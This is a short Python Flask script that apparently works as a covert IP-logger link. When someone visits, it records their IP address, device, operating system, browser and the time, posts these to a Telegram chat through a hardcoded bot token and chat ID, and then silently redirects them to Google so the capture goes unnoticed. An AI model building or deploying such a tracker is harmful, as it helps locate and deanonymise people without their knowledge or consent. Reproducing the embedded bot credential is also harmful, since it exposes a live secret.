from flask import Flask, request, redirect
import requests
import user_agents
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo"
CHAT_ID = "6690693429"
REDIRECT_URL = "https://www.google.com/"

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    requests.post(url, data=data)

@app.route('/')
def log_user():
    ip = request.remote_addr
    ua_string = request.headers.get('User-Agent')
    ua = user_agents.parse(ua_string)
    device = f"{ua.device.family} | {ua.os.family} {ua.os.version_string} | {ua.browser.family} {ua.browser.version_string}"
    time = datetime.now().strftime("%d-%b-%Y %I:%M %p")
    message = f"""
📥 <b>New Click Logged!</b>
🌐 <b>IP:</b> {ip}
🕹 <b>Device:</b> {device}
⏱ <b>Time:</b> {time}
"""
    send_to_telegram(message.strip())
    return redirect(REDIRECT_URL)

if __name__ == '__main__':
    app.run()
